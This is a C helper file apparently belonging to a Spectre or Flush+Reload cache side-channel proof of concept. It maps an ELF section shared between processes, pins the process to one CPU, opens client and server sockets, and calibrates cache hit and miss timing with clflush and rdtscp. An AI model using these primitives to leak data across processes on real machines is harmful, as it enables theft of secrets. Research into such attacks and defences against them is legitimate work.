
#define _GNU_SOURCE
#include "common.h"

#include <sched.h>

#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <assert.h>
#include <errno.h>
#include <elf.h>
#include <emmintrin.h>
#include <x86intrin.h>

#include "spectre.h"

int read_port(const char *p)
{
    assert(p);

    char *endptr;
    errno = 0;
    int port = strtol(p, &endptr, 10);
    if (port < 1024 || port > 65535 || (*endptr != '\0'))
        return -1;

    return port;
}

static uint8_t dummy;
uint8_t *mapfile(const char *file, off_t offset, size_t length)
{
    assert(file);

    int fd = open(file, O_RDONLY);
    if (!fd)
    {
        perror("open");
        return NULL;
    }

    uint8_t *array = mmap(NULL, length, PROT_READ, MAP_SHARED, fd, offset);
    if (array == MAP_FAILED)
    {
        perror("mmap");
        close(fd);
        return NULL;
    }
    close(fd);

    // Gentle touch
    for (size_t i = 0; i < length; i++)
        dummy &= array[i];

    return array;
}

#define ENSURE(cond)                        \
    do {                                    \
        if ((cond))                         \
        {                                   \
            printf("[OK]\n");               \
        }                                   \
        else                                \
        {                                   \
            printf("[FAILED]\nAborting\n"); \
            return -1;                      \
        }                                   \
    } while (0)

ssize_t secoffset(void *mem, const char *secname, size_t *secsize)
{
    assert(mem);
    assert(secname);

    // Check file format
    printf("Checking file format  - ELF expected   ");
    Elf64_Ehdr eh = *(Elf64_Ehdr*)mem;
    ENSURE(eh.e_ident[0] == 0x7f && eh.e_ident[1] == 'E' &&
           eh.e_ident[2] == 'L'  && eh.e_ident[3] == 'F');

    // Check version
    printf("Checking architecture - 64bit expected ");
    ENSURE(eh.e_ident[4] == ELFCLASS64);

    // Ensure symbols were not stripped + not a special format
    printf("Checking section header table index    ");
    ENSURE(eh.e_shstrndx != SHN_XINDEX);

    printf("Quick report:\n");
    printf("e_shoff       = %lu\n", eh.e_shoff);
    printf("e_shentsize   = %d\n",  eh.e_shentsize);
    printf("e_shstrndx    = %d\n",  eh.e_shstrndx);
    printf("e_shnum       = %d\n",  eh.e_shnum);

    Elf64_Shdr sh = *(Elf64_Shdr*)(mem + eh.e_shoff +
        eh.e_shentsize*eh.e_shstrndx);
    printf("Section header table offset = %lu\n", sh.sh_offset);

    // Find target section
    printf("Looking for target section             ");
    int secnum = 0;
    int found  = 0;
    Elf64_Shdr target;
    while (secnum <= eh.e_shnum)
    {
        target = *(Elf64_Shdr*)(mem + eh.e_shoff + eh.e_shentsize*secnum++);
        if (!strcmp(TARGET_SECTION, (mem + sh.sh_offset + target.sh_name)))
        {
            found = 1;
            break;
        }
    }
    ENSURE(found);

    printf("Section name  = %s\n",
        (char*)(mem + sh.sh_offset + target.sh_name));
    printf("Section size  = %lu\n", target.sh_size);
    printf("Section align = %lu\n", target.sh_addralign);
    printf("Map %p bytes from %p offset\n", (void*)target.sh_size,
        (void*)target.sh_offset);

    if (secsize)
        *secsize = target.sh_size;
    return target.sh_offset;
}

#undef ENSURE

uint8_t *mapsection(const char *file, const char *secname, size_t secsize)
{
    assert(file);
    assert(secname);

    int err;
    int fd = open(file, O_RDONLY);
    if (fd < 0)
    {
        perror("open");
        return NULL;
    }
    struct stat st;
    err = fstat(fd, &st);
    if (err < 0)
    {
        perror("fstat");
        close(fd);
        return NULL;
    }

    uint8_t *filemap = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (filemap == MAP_FAILED)
    {
        perror("mmap");
        close(fd);
        return NULL;
    }

    ssize_t offt = secoffset(filemap, TARGET_SECTION, NULL);
    if (offt < 0)
    {
        munmap(filemap, st.st_size);
        close(fd);
        return NULL;
    }

    uint8_t *array = mmap(NULL, secsize, PROT_READ, MAP_SHARED, fd, offt);
    if (array == MAP_FAILED)
    {
        perror("mmap");
        munmap(filemap, st.st_size);
        close(fd);
        return NULL;
    }

    munmap(filemap, st.st_size);
    close(fd);
    return array;
}

int set_cpu(int cpu)
{
    assert(cpu >= 0);

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);

    int err = sched_setaffinity(getpid(), sizeof(cpuset), &cpuset);
    if (err < 0)
    {
        perror("sched_setaffinity");
        return -1;
    }

    return 0;
}

int setup_client(const char *addr, int port)
{
    assert(addr);
    assert(port < 65536);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(port);
    int err;
    err = inet_pton(AF_INET, addr, &sa.sin_addr.s_addr);
    if (err != 1)
    {
        perror("inet_pton");
        close(sock);
        return -1;
    }

    err = connect(sock, (struct sockaddr*)&sa, sizeof(sa));
    if (err)
    {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

int setup_server(int port)
{
    assert(port < 65536);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    /* Reusing in the following call to avoid creating new variables */
    int err = 1;
    err = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &err, sizeof(err));
    if (err < 0)
    {
        perror("setsockopt");
        close(sock);
        return -1;
    }
    
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(port);
    sa.sin_addr.s_addr = htonl(INADDR_ANY);

    err = bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    if (err)
    {
        perror("bind");
        close(sock);
        return -1;
    }

    err = listen(sock, 10);
    if (err)
    {
        perror("listen");
        close(sock);
        return -1;
    }

    return sock;
}

uint64_t calculate_threshold(int runs)
{
    assert(runs > 0);

    uint8_t  target = 0;
    uint64_t cumulative_time = 0;

    printf("Checking cache hit time,  %d runs...\n", runs);
    cumulative_time = 0;
    // Loading 'target' into cache
    dummy ^= target;
    for (int i = 0; i < runs; i++)
        cumulative_time += measure_access_time(&target);

    int time_hit = cumulative_time / runs;
    printf("Cahce hit time:  %3d cycles\n", time_hit);

    printf("Checking cache miss time, %d runs...\n", runs);
    cumulative_time = 0;
    for (int i = 0; i < runs; i++)
    {
        _mm_clflush(&target);
        cumulative_time += measure_access_time(&target);
        // _mm_lfence();
    }
    int time_miss = cumulative_time / runs;
    printf("Cahce miss time: %3d cycles\n", time_miss);
    
    uint64_t threshold = (time_hit + time_miss) / 3;
    printf("Using threshold: %3lu cycles\n", threshold);

    return threshold;
}

uint64_t measure_access_time(uint8_t *target)
{
    assert(target);

    unsigned junk = 0;

    uint64_t start  = __rdtscp(&junk);
    dummy ^= *target;
    uint64_t finish = __rdtscp(&junk);

    return finish - start;
}

